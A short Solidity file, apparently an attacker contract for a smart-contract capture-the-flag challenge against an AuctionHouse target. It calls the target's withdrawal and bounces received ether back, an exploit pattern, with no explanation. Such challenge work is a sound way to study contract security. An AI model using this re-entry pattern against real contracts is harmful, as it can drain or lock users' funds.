// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.7.0;

import "./AuctionHouse.sol";


contract Contract{
        address payable public YOUR_CHALLENGE_CONTRACT_ADDRESS = payable(address(0x1af67842c2F3f59eE85af65FfBFD542c074814d2));
	AuctionHouse public creature = AuctionHouse(YOUR_CHALLENGE_CONTRACT_ADDRESS);

	receive() external payable {
	//function attack2(uint256 amount) payable external {
		//creature.transfer(value);
		YOUR_CHALLENGE_CONTRACT_ADDRESS.call{value: msg.value}("");
        }


	function withdraw() external {
		creature.withdrawFromAuction();
	}

}

